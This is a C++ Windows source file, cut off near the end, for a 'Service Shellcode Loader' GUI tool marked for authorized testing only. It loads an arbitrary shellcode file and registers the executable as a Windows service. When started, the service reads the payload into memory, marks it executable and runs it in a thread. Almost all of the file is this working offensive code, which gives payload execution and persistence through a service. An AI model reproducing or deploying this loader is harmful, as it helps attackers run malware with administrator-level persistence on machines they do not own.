// service_loader_gui.cpp — Service Shellcode Loader (GUI)
// Authorized security testing only.
//
// Compile (MSVC):
//   cl /O2 /EHsc service_loader_gui.cpp /link user32.lib gdi32.lib comdlg32.lib shell32.lib advapi32.lib
//
// Compile (MinGW):
//   x86_64-w64-mingw32-g++ -O2 -mwindows -static -o service_loader.exe \
//       service_loader_gui.cpp -luser32 -lgdi32 -lcomdlg32 -lshell32 -ladvapi32

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <commdlg.h>
#include <shellapi.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "comdlg32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// ═══════════════════════════════════════════════════════════════════
// CONSTANTS
// ═══════════════════════════════════════════════════════════════════

#define IDI_APP_ICON        101

// Control IDs
#define IDC_STATIC_TITLE    1001
#define IDC_STATIC_SUB      1002
#define IDC_EDIT_PATH       1003
#define IDC_BTN_BROWSE      1004
#define IDC_BTN_LOAD        1005
#define IDC_BTN_CLEAR       1006
#define IDC_STATIC_STATUS   1007
#define IDC_STATIC_SIZE     1008
#define IDC_STATIC_PREVIEW  1009
#define IDC_EDIT_PREVIEW    1010
#define IDC_EDIT_SVCNAME    1011
#define IDC_STATIC_SVCNAME  1012
#define IDC_BTN_INSTALL     1013
#define IDC_BTN_START       1014
#define IDC_BTN_STOP        1015
#define IDC_BTN_UNINSTALL   1016
#define IDC_CHECK_HIDDEN    1017
#define IDC_PROGRESS        1018

// Menu IDs
#define IDM_FILE_OPEN       2001
#define IDM_FILE_EXIT       2002
#define IDM_HELP_ABOUT      2003
#define IDM_ACTION_INSTALL  2004
#define IDM_ACTION_START    2005
#define IDM_ACTION_STOP     2006
#define IDM_ACTION_REMOVE   2007

// ═══════════════════════════════════════════════════════════════════
// GLOBALS
// ═══════════════════════════════════════════════════════════════════

HINSTANCE g_hInst          = nullptr;
HWND      g_hMain          = nullptr;
HWND      g_hPathEdit      = nullptr;
HWND      g_hPreview       = nullptr;
HWND      g_hStatus        = nullptr;
HWND      g_hSizeLabel     = nullptr;
HWND      g_hSvcNameEdit   = nullptr;
HWND      g_hProgress      = nullptr;

BYTE*     g_shellcode      = nullptr;
SIZE_T    g_shellcodeLen   = 0;
wchar_t   g_shellcodePath[MAX_PATH] = {0};
wchar_t   g_serviceName[256] = L"AAAServiceTest1";

SERVICE_STATUS        g_ServiceStatus;
SERVICE_STATUS_HANDLE g_hStatusHandle;
HANDLE                g_hWorkerThread;

// ═══════════════════════════════════════════════════════════════════
// SERVICE WORKER LOGIC (runs inside the spawned service process)
// ═══════════════════════════════════════════════════════════════════

void ControlHandler(DWORD request);
void ServiceMain(int argc, char** argv);

// ═══════════════════════════════════════════════════════════════════
// GUI HELPERS
// ═══════════════════════════════════════════════════════════════════

static void SetStatus(const wchar_t* msg, COLORREF color = RGB(0, 120, 215)) {
    if (g_hStatus) {
        SetWindowTextW(g_hStatus, msg);
        // Redraw with color
        HDC hdc = GetDC(g_hStatus);
        RECT rc;
        GetClientRect(g_hStatus, &rc);
        SetTextColor(hdc, color);
        SetBkMode(hdc, TRANSPARENT);
        ReleaseDC(g_hStatus, hdc);
        InvalidateRect(g_hStatus, nullptr, TRUE);
    }
}

static void UpdatePreview() {
    if (!g_hPreview) return;

    if (!g_shellcode || g_shellcodeLen == 0) {
        SetWindowTextW(g_hPreview, L"No shellcode loaded.");
        return;
    }

    // Build a hex preview
    wchar_t* buf = (wchar_t*)malloc(64 * 1024 * sizeof(wchar_t));
    if (!buf) return;

    int pos = 0;
    pos += swprintf(buf + pos, 64*1024 - pos,
        L"// Shellcode Preview\r\n"
        L"// Path: %ls\r\n"
        L"// Size: %zu bytes\r\n"
        L"// ---\r\n\r\n",
        g_shellcodePath, g_shellcodeLen);

    // Show up to 512 bytes
    SIZE_T show = g_shellcodeLen < 512 ? g_shellcodeLen : 512;
    for (SIZE_T i = 0; i < show; i++) {
        if (i % 16 == 0) {
            pos += swprintf(buf + pos, 64*1024 - pos,
                L"\r\n0x%04zX: ", i);
        }
        pos += swprintf(buf + pos, 64*1024 - pos,
            L"%02X ", g_shellcode[i]);
    }

    if (g_shellcodeLen > show) {
        pos += swprintf(buf + pos, 64*1024 - pos,
            L"\r\n\r\n... (%zu more bytes not shown)", g_shellcodeLen - show);
    }

    SetWindowTextW(g_hPreview, buf);
    free(buf);
}

static void UpdateSizeLabel() {
    if (!g_hSizeLabel) return;
    wchar_t buf[128];
    if (g_shellcodeLen > 0) {
        swprintf(buf, 128, L"Size: %zu bytes (%.2f KB)",
            g_shellcodeLen, g_shellcodeLen / 1024.0);
    } else {
        wcscpy(buf, L"Size: —");
    }
    SetWindowTextW(g_hSizeLabel, buf);
}

static bool LoadShellcodeFile(const wchar_t* path) {
    if (g_shellcode) {
        free(g_shellcode);
        g_shellcode = nullptr;
        g_shellcodeLen = 0;
    }

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        MessageBoxW(g_hMain, L"Cannot open file.",
            L"Error", MB_ICONERROR | MB_OK);
        return false;
    }

    DWORD size = GetFileSize(hFile, nullptr);
    if (size == 0 || size == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        MessageBoxW(g_hMain, L"File is empty or too large.",
            L"Error", MB_ICONERROR | MB_OK);
        return false;
    }

    g_shellcode = (BYTE*)malloc(size);
    if (!g_shellcode) {
        CloseHandle(hFile);
        MessageBoxW(g_hMain, L"Memory allocation failed.",
            L"Error", MB_ICONERROR | MB_OK);
        return false;
    }

    DWORD read = 0;
    if (!ReadFile(hFile, g_shellcode, size, &read, nullptr) || read != size) {
        free(g_shellcode);
        g_shellcode = nullptr;
        CloseHandle(hFile);
        MessageBoxW(g_hMain, L"Read failed.",
            L"Error", MB_ICONERROR | MB_OK);
        return false;
    }

    CloseHandle(hFile);
    g_shellcodeLen = size;
    wcscpy(g_shellcodePath, path);

    UpdatePreview();
    UpdateSizeLabel();

    wchar_t status[512];
    swprintf(status, 512, L"Loaded: %zu bytes", g_shellcodeLen);
    SetStatus(status, RGB(0, 150, 0));

    return true;
}

static void BrowseShellcode() {
    wchar_t path[MAX_PATH] = {0};

    OPENFILENAMEW ofn = {0};
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner   = g_hMain;
    ofn.lpstrFilter = L"Shellcode Files (*.bin)\0*.bin\0"
                      L"All Files (*.*)\0*.*\0";
    ofn.lpstrFile   = path;
    ofn.nMaxFile    = MAX_PATH;
    ofn.lpstrTitle  = L"Select Shellcode File";
    ofn.Flags       = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST | OFN_EXPLORER;

    if (GetOpenFileNameW(&ofn)) {
        SetWindowTextW(g_hPathEdit, path);
        LoadShellcodeFile(path);
    }
}

// ═══════════════════════════════════════════════════════════════════
// SERVICE INSTALL / CONTROL (GUI-side operations)
// ═══════════════════════════════════════════════════════════════════

static bool IsAdmin() {
    BOOL admin = FALSE;
    PSID sid = nullptr;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&auth, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0,0,0,0,0,0, &sid)) {
        CheckTokenMembership(nullptr, sid, &admin);
        FreeSid(sid);
    }
    return admin == TRUE;
}

static bool InstallService(const wchar_t* svcName) {
    if (!IsAdmin()) {
        MessageBoxW(g_hMain,
            L"Administrator privileges required.",
            L"Access Denied", MB_ICONWARNING);
        return false;
    }

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        MessageBoxW(g_hMain, L"OpenSCManager failed.",
            L"Error", MB_ICONERROR);
        return false;
    }

    wchar_t cmdLine[MAX_PATH + 64];
    swprintf(cmdLine, MAX_PATH + 64, L"\"%ls\" --service", exePath);

    SC_HANDLE svc = CreateServiceW(scm, svcName, svcName,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        cmdLine, nullptr, nullptr, nullptr, nullptr, nullptr);

    if (!svc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            MessageBoxW(g_hMain, L"Service already exists.",
                L"Info", MB_ICONINFORMATION);
            CloseServiceHandle(scm);
            return false;
        }
        wchar_t msg[256];
        swprintf(msg, 256, L"CreateService failed: %lu", err);
        MessageBoxW(g_hMain, msg, L"Error", MB_ICONERROR);
        CloseServiceHandle(scm);
        return false;
    }

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    SetStatus(L"Service installed. Use 'Start' to run.", RGB(0, 150, 0));
    return true;
}

static bool StartServiceByName(const wchar_t* svcName) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;

    SC_HANDLE svc = OpenServiceW(scm, svcName, SERVICE_START);
    if (!svc) {
        CloseServiceHandle(scm);
        return false;
    }

    BOOL ok = StartServiceW(svc, 0, nullptr);
    if (!ok) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            SetStatus(L"Service is already running.", RGB(200, 120, 0));
        } else {
            wchar_t msg[256];
            swprintf(msg, 256, L"StartService failed: %lu", err);
            SetStatus(msg, RGB(200, 0, 0));
        }
    } else {
        SetStatus(L"Service started.", RGB(0, 150, 0));
    }

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return ok != 0;
}

static bool StopServiceByName(const wchar_t* svcName) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;

    SC_HANDLE svc = OpenServiceW(scm, svcName, SERVICE_STOP);
    if (!svc) {
        CloseServiceHandle(scm);
        return false;
    }

    SERVICE_STATUS ss = {0};
    BOOL ok = ControlService(svc, SERVICE_CONTROL_STOP, &ss);

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    if (ok) SetStatus(L"Service stopped.", RGB(0, 150, 0));
    else    SetStatus(L"Stop failed (may not be running).", RGB(200, 0, 0));
    return ok != 0;
}

static bool UninstallService(const wchar_t* svcName) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;

    SC_HANDLE svc = OpenServiceW(scm, svcName, SERVICE_STOP | DELETE);
    if (!svc) {
        CloseServiceHandle(scm);
        return false;
    }

    SERVICE_STATUS ss = {0};
    ControlService(svc, SERVICE_CONTROL_STOP, &ss);

    BOOL ok = DeleteService(svc);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    if (ok) SetStatus(L"Service uninstalled.", RGB(0, 150, 0));
    else    SetStatus(L"Uninstall failed.", RGB(200, 0, 0));
    return ok != 0;
}

// ═══════════════════════════════════════════════════════════════════
// SERVICE ENTRY POINT — called when SCM starts our exe with --service
// ═══════════════════════════════════════════════════════════════════

// The service must load the shellcode from the file path passed at
// install time. We store it in a companion .dat file next to the exe.
// For simplicity, we read the same path the GUI used.

static bool ReadShellcodeFromDisk(const wchar_t* path,
                                  BYTE** outBuf, SIZE_T* outLen) {
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;

    DWORD size = GetFileSize(h, nullptr);
    if (size == 0 || size == INVALID_FILE_SIZE) {
        CloseHandle(h);
        return false;
    }

    BYTE* buf = (BYTE*)malloc(size);
    if (!buf) { CloseHandle(h); return false; }

    DWORD read = 0;
    if (!ReadFile(h, buf, size, &read, nullptr) || read != size) {
        free(buf);
        CloseHandle(h);
        return false;
    }
    CloseHandle(h);

    *outBuf = buf;
    *outLen = size;
    return true;
}

void ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        g_ServiceStatus.dwWin32ExitCode = 0;
        g_ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
        SetServiceStatus(g_hStatusHandle, &g_ServiceStatus);
        return;
    default:
        break;
    }
    SetServiceStatus(g_hStatusHandle, &g_ServiceStatus);
}

void ServiceMain(int argc, char** argv) {
    // The service name must match what we registered
    // We read it from a companion file or use the default
    wchar_t svcName[256] = L"AAAServiceTest1";

    // Try to read from a config file next to the exe
    wchar_t cfgPath[MAX_PATH];
    GetModuleFileNameW(nullptr, cfgPath, MAX_PATH);
    wchar_t* dot = wcsrchr(cfgPath, L'.');
    if (dot) wcscpy(dot, L".cfg");

    HANDLE hCfg = CreateFileW(cfgPath, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hCfg != INVALID_HANDLE_VALUE) {
        DWORD rd = 0;
        ReadFile(hCfg, svcName, sizeof(svcName) - 1, &rd, nullptr);
        CloseHandle(hCfg);
        svcName[rd / sizeof(wchar_t)] = 0;
    }

    g_hStatusHandle = RegisterServiceCtrlHandlerW(svcName, 
        (LPHANDLER_FUNCTION)ControlHandler);
    if (g_hStatusHandle == nullptr) return;

    g_ServiceStatus.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState            = SERVICE_START_PENDING;
    g_ServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP |
                                                SERVICE_ACCEPT_SHUTDOWN;
    g_ServiceStatus.dwWin32ExitCode           = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint              = 0;
    g_ServiceStatus.dwWaitHint                = 0;
    SetServiceStatus(g_hStatusHandle, &g_ServiceStatus);

    // Load shellcode from the saved .bin path next to the exe
    wchar_t shellPath[MAX_PATH];
    GetModuleFileNameW(nullptr, shellPath, MAX_PATH);
    dot = wcsrchr(shellPath, L'.');
    if (dot) wcscpy(dot, L".bin");

    BYTE* sc = nullptr;
    SIZE_T scLen = 0;
    if (!ReadShellcodeFromDisk(shellPath, &sc, &scLen)) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = ERROR_FILE_NOT_FOUND;
        SetServiceStatus(g_hStatusHandle, &g_ServiceStatus);
        return;
    }

    // Execute shellcode
    PVOID mem = VirtualAlloc(nullptr, scLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (mem) {
        memcpy(mem, sc, scLen);
        DWORD oldProtect = 0;
        VirtualProtect(mem, scLen, PAGE_EXECUTE_READWRITE, &oldProtect);

        HANDLE hThread = CreateThread(nullptr, 0,
            (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);

        g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        SetServiceStatus(g_hStatusHandle, &g_ServiceStatus);

        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
    }

    free(sc);

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_hStatusHandle, &g_ServiceStatus);
}

// ═══════════════════════════════════════════════════════════════════
// WINDOW PROCEDURE
// ═══════════════════════════════════════════════════════════════════

HFONT g_hFontUI    = nullptr;
HFONT g_hFontMono  = nullptr;
HFONT g_hFontTitle = nullptr;

static void CreateFonts() {
    g_hFontUI = CreateFontW(-14, 0, 0, 0, FW_NORMAL, 0, 0, 0,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
    g_hFontMono = CreateFontW(-12, 0, 0, 0, FW_NORMAL, 0, 0, 0,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, FIXED_PITCH | FF_MODERN, L"Consolas");
    g_hFontTitle = CreateFontW(-22, 0, 0, 0, FW_BOLD, 0, 0, 0,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
}

static void DestroyFonts() {
    if (g_hFontUI)    DeleteObject(g_hFontUI);
    if (g_hFontMono)  DeleteObject(g_hFontMono);
    if (g_hFontTitle) DeleteObject(g_hFontTitle);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE: {
        CreateFonts();

        // Title
        HWND hTitle = CreateWindowW(L"STATIC", L"Service Shellcode Loader",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            20, 15, 600, 30, hWnd, (HMENU)IDC_STATIC_TITLE,
            g_hInst, nullptr);
        SendMessage(hTitle, WM_SETFONT, (WPARAM)g_hFontTitle, TRUE);

        // Subtitle
        HWND hSub = CreateWindowW(L"STATIC",
            L"Authorized security testing only. Administrator privileges required.",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            20, 50, 700, 20, hWnd, (HMENU)IDC_STATIC_SUB,
            g_hInst, nullptr);
        SendMessage(hSub, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        // Path label
        HWND hPathLabel = CreateWindowW(L"STATIC", L"Shellcode File:",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            20, 90, 150, 20, hWnd, nullptr, g_hInst, nullptr);
        SendMessage(hPathLabel, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        // Path edit
        g_hPathEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | ES_LEFT | ES_AUTOHSCROLL | ES_READONLY,
            20, 112, 620, 28, hWnd, (HMENU)IDC_EDIT_PATH,
            g_hInst, nullptr);
        SendMessage(g_hPathEdit, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        // Browse button
        HWND hBrowse = CreateWindowW(L"BUTTON", L"Browse...",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            650, 112, 100, 28, hWnd, (HMENU)IDC_BTN_BROWSE,
            g_hInst, nullptr);
        SendMessage(hBrowse, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        // Load button
        HWND hLoad = CreateWindowW(L"BUTTON", L"Reload",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            760, 112, 80, 28, hWnd, (HMENU)IDC_BTN_LOAD,
            g_hInst, nullptr);
        SendMessage(hLoad, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        // Clear button
        HWND hClear = CreateWindowW(L"BUTTON", L"Clear",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            850, 112, 80, 28, hWnd, (HMENU)IDC_BTN_CLEAR,
            g_hInst, nullptr);
        SendMessage(hClear, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        // Size label
        g_hSizeLabel = CreateWindowW(L"STATIC", L"Size: —",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            20, 148, 200, 20, hWnd, (HMENU)IDC_STATIC_SIZE,
            g_hInst, nullptr);
        SendMessage(g_hSizeLabel, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        // Service name label
        HWND hSvcLabel = CreateWindowW(L"STATIC", L"Service Name:",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            250, 148, 120, 20, hWnd, (HMENU)IDC_STATIC_SVCNAME,
            g_hInst, nullptr);
        SendMessage(hSvcLabel, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        // Service name edit
        g_hSvcNameEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT",
            L"AAAServiceTest1",
            WS_CHILD | WS_VISIBLE | ES_LEFT | ES_AUTOHSCROLL,
            370, 145, 300, 26, hWnd, (HMENU)IDC_EDIT_SVCNAME,
            g_hInst, nullptr);
        SendMessage(g_hSvcNameEdit, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        // Preview label
        HWND hPrevLabel = CreateWindowW(L"STATIC", L"Shellcode Preview (hex):",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            20, 185, 300, 20, hWnd, nullptr, g_hInst, nullptr);
        SendMessage(hPrevLabel, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        // Preview edit
        g_hPreview = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | WS_VSCROLL | WS_HSCROLL |
            ES_MULTILINE | ES_READONLY | ES_AUTOVSCROLL,
            20, 208, 910, 220, hWnd, (HMENU)IDC_EDIT_PREVIEW,
            g_hInst, nullptr);
        SendMessage(g_hPreview, WM_SETFONT, (WPARAM)g_hFontMono, TRUE);
        SetWindowTextW(g_hPreview, L"No shellcode loaded.");

        // Service control buttons
        HWND hInstall = CreateWindowW(L"BUTTON", L"Install Service",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            20, 445, 160, 36, hWnd, (HMENU)IDC_BTN_INSTALL,
            g_hInst, nullptr);
        SendMessage(hInstall, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        HWND hStart = CreateWindowW(L"BUTTON", L"Start Service",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            190, 445, 160, 36, hWnd, (HMENU)IDC_BTN_START,
            g_hInst, nullptr);
        SendMessage(hStart, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        HWND hStop = CreateWindowW(L"BUTTON", L"Stop Service",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            360, 445, 160, 36, hWnd, (HMENU)IDC_BTN_STOP,
            g_hInst, nullptr);
        SendMessage(hStop, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        HWND hUninstall = CreateWindowW(L"BUTTON", L"Uninstall Service",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            530, 445, 180, 36, hWnd, (HMENU)IDC_BTN_UNINSTALL,
            g_hInst, nullptr);
        SendMessage(hUninstall, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        // Status
        g_hStatus = CreateWindowW(L"STATIC",
            L"Ready. Select a shellcode file to begin.",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            20, 495, 910, 25, hWnd, (HMENU)IDC_STATIC_STATUS,
            g_hInst, nullptr);
        SendMessage(g_hStatus, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);

        // Progress bar
        g_hProgress = CreateWindowW(PROGRESS_CLASSW, L"",
            WS_CHILD | WS_VISIBLE | PBS_SMOOTH,
            20, 525, 910, 8, hWnd, (HMENU)IDC_PROGRESS,
            g_hInst, nullptr);

        return 0;
    }

    case WM_COMMAND: {
        int id = LOWORD(wParam);
        switch (id) {
        case IDC_BTN_BROWSE:
            BrowseShellcode();
            return 0;

        case IDC_BTN_LOAD: {
            wchar_t path[MAX_PATH];
            GetWindowTextW(g_hPathEdit, path, MAX_PATH);
            if (wcslen(path) > 0) LoadShellcodeFile(path);
            return 0;
        }

        case IDC_BTN_CLEAR:
            if (g_shellcode) { free(g_shellcode); g_shellcode = nullptr; }
            g_shellcodeLen = 0;
            g_shellcodePath[0] = 0;
            SetWindowTextW(g_hPathEdit, L"");
            SetWindowTextW(g_hPreview, L"No shellcode loaded.");
            UpdateSizeLabel();
            SetStatus(L"Cleared.");
            return 0;

        case IDC_BTN_INSTALL: {
            if (g_shellcodeLen == 0) {
                MessageBoxW(hWnd, L"Load a shellcode file first.",
                    L"Info", MB_ICONINFORMATION);
                return 0;
            }
            wchar_t svcName[256];
            GetWindowTextW(g_hSvcNameEdit, svcName, 256);

            // Save shellcode next to the exe as <exe>.bin
            wchar_t exePath[MAX_PATH];
            GetModuleFileNameW(nullptr, exePath, MAX_PATH);
            wchar_t* dot = wcsrchr(exePath, L'.');
            if (dot) wcscpy(dot, L".bin");

            HANDLE hOut = CreateFileW(exePath, GENERIC_WRITE, 0, nullptr,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hOut == INVALID_HANDLE_VALUE) {
                MessageBoxW(hWnd, L"Cannot save shellcode.",
                    L"Error", MB_ICONERROR);
                return 0;
            }
            DWORD wr = 0;
            WriteFile(hOut, g_shellcode, (DWORD)g_shellcodeLen, &wr, nullptr);
            CloseHandle(hOut);

            // Save service name to <exe>.cfg
            GetModuleFileNameW(nullptr, exePath, MAX_PATH);
            dot = wcsrchr(exePath, L'.');
            if (dot) wcscpy(dot, L".cfg");
            hOut = CreateFileW(exePath, GENERIC_WRITE, 0, nullptr,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hOut != INVALID_HANDLE_VALUE) {
                WriteFile(hOut, svcName,
                    (DWORD)(wcslen(svcName) * sizeof(wchar_t)),
                    &wr, nullptr);
                CloseHandle(hOut);
            }

            InstallService(svcName);
            return 0;
        }

        case IDC_BTN_START: {
            wchar_t svcName[256];
            GetWindowTextW(g_hSvcNameEdit, svcName, 256);
            StartServiceByName(svcName);
            return 0;
        }

        case IDC_BTN_STOP: {
            wchar_t svcName[256];
            GetWindowTextW(g_hSvcNameEdit, svcName, 256);
            StopServiceByName(svcName);
            return 0;
        }

        case IDC_BTN_UNINSTALL: {
            wchar_t svcName[256];
            GetWindowTextW(g_hSvcNameEdit, svcName, 256);
            UninstallService(svcName);
            return 0;
        }

        case IDM_FILE_OPEN:
            BrowseShellcode();
            return 0;

        case IDM_FILE_EXIT:
            PostMessageW(hWnd, WM_CLOSE, 0, 0);
            return 0;

        case IDM_ACTION_INSTALL: {
            wchar_t svcName[256];
            GetWindowTextW(g_hSvcNameEdit, svcName, 256);
            InstallService(svcName);
            return 0;
        }

        case IDM_ACTION_START: {
            wchar_t svcName[256];
            GetWindowTextW(g_hSvcNameEdit, svcName, 256);
            StartServiceByName(svcName);
            return 0;
        }

        case IDM_ACTION_STOP: {
            wchar_t svcName[256];
            GetWindowTextW(g_hSvcNameEdit, svcName, 256);
            StopServiceByName(svcName);
            return 0;
        }

        case IDM_ACTION_REMOVE: {
            wchar_t svcName[256];
            GetWindowTextW(g_hSvcNameEdit, svcName, 256);
            UninstallService(svcName);
            return 0;
        }

        case IDM_HELP_ABOUT:
            MessageBoxW(hWnd,
                L"Service Shellcode Loader\n"
                L"Version 1.0\n\n"
                L"Authorized security testing only.\n"
                L"Requires Administrator privileges.\n\n"
                L"Usage:\n"
                L"  1. Browse for a shellcode .bin file\n"
                L"  2. Set the service name (default: AAAServiceTest1)\n"
                L"  3. Click 'Install Service'\n"
                L"  4. Click 'Start Service' to execute\n"
                L"  5. Click 'Stop Service' or 'Uninstall Service'\n\n"
                L"The shellcode is saved next to the exe as <exe>.bin\n"
                L"and is loaded by the service on start.",
                L"About", MB_ICONINFORMATION);
            return 0;
        }
        return 0;
    }

    case WM_CTLCOLORSTATIC: {
        HDC hdc = (HDC)wParam;
        HWND hCtl = (HWND)lParam;
        if (hCtl == g_hStatus) {
            SetBkMode(hdc, TRANSPARENT);
            return (LRESULT)GetStockObject(NULL_BRUSH);
        }
        SetBkMode(hdc, TRANSPARENT);
        return (LRESULT)GetSysColorBrush(COLOR_BTNFACE);
    }

    case WM_CLOSE:
        DestroyWindow(hWnd);
        return 0;

    case WM_DESTROY:
        DestroyFonts();
        if (g_shellcode) { free(g_shellcode); g_shellcode = nullptr; }
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcW(hWnd, msg, wParam, lParam);
}

// ═══════════════════════════════════════════════════════════════════
// MAIN ENTRY — dispatches either to GUI or to service
// ═══════════════════════════════════════════════════════════════════

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, LPWSTR lpCmdLine, int) {
    g_hInst = hInstance;

    // Check if we're being started as a service
    if (lpCmdLine && wcsstr(lpCmdLine, L"--service")) {
        SERVICE_TABLE_ENTRYW ServiceTable[2];
        ServiceTable[0].lpServiceName = (LPWSTR)L"AAAServiceTest1";
        ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTIONW)ServiceMain;
        ServiceTable[1].lpServiceName = nullptr;
        ServiceTable[1].lpServiceProc = nullptr;
        StartServiceCtrlDispatcherW(ServiceTable);
        return 0;
    }

    // Otherwise, run the GUI
    WNDCLASSEXW wc = {0};
    wc.cbSize        = sizeof(wc);
    wc.style         = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInstance;
    wc.hCursor       = LoadCursorW(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wc.lpszClassName = L"ServiceLoaderGUI";
    wc.hIcon         = LoadIconW(nullptr, IDI_APPLICATION);

    if (!RegisterClassExW(&wc)) {
        MessageBoxW(nullptr, L"Failed to register window class.",
            L"Error", MB_ICONERROR);
        return 1;
    }

    // Center the window
    int width = 960, height = 590;
    int x = (GetSystemMetrics(SM_CXSCREEN) - width) / 2;
    int y = (GetSystemMetrics(SM_CYSCREEN) - height) / 2;

    g_hMain = CreateWindowExW(0,
        L"ServiceLoaderGUI",
        L"Service Shellcode Loader — Authorized Testing Only",
        WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX,
        x, y, width, height,
        nullptr, nullptr, hInstance, nullptr);

    if (!g_hMain) {
